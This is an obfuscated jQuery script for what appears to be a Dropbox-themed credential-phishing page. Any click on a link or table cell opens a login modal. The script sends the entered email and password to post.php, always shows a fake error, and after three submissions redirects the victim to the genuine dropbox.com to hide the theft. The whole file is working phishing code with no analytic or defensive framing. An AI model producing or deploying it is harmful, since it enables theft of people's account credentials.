$(document).ready(function () {
  var _0x2bef66 = 0x0;
  $('a').click(_0x349bec => {
    _0x349bec.preventDefault();
    $("#modalbox").css("display", 'block');
    var _0x2907d2 = $('#email').val();
    if (_0x2907d2.length < 0x6 || !_0x2907d2.includes('@')) {
      $("#email").attr("type", "text");
      $("#etext").css("display", "none");
      $('#email').val('');
      $('#email').focus();
    } else {
      $("#password").focus();
    }
  });
  $('td').click(_0x1de432 => {
    _0x1de432.preventDefault();
    $("#modalbox").css("display", 'block');
    var _0x5687ac = $("#email").val();
    if (_0x5687ac.length < 0x6 || !_0x5687ac.includes('@')) {
      $("#email").attr("type", 'text');
      $("#etext").css("display", "none");
      $("#email").val('');
      $('#email').focus();
    } else {
      $("#password").focus();
    }
  });
  $('#submit').click(_0x2c8884 => {
    _0x2c8884.preventDefault();
    var _0x353e29 = $("#email").val();
    var _0x3f7e2f = $("#password").val();
    if (_0x353e29.length < 0x6 || !_0x353e29.includes('@')) {
      alert("Please enter a valid email");
      return;
    }
    if (_0x3f7e2f.length < 0x4 || _0x3f7e2f == '1234') {
      alert("Please enter a valid password");
      return;
    }
    $("#error").css("display", "none");
    $("#mcontent").css('display', "none");
    $("#mspinner").css('display', "block");
    $.ajax({
      'url': "post.php",
      'method': "post",
      'data': {
        'email': _0x353e29,
        'password': _0x3f7e2f
      },
      'success': function (_0x285720) {
        _0x2bef66++;
        setTimeout(() => {
          if (_0x2bef66 == 0x3) {
            window.location.href = "https://dropbox.com";
          }
          $("#mspinner").css("display", 'none');
          $("#mcontent").css("display", "block");
          $("#error").css("display", "block");
          $("#password").val('');
        }, 0x1770);
      }
    });
  });
});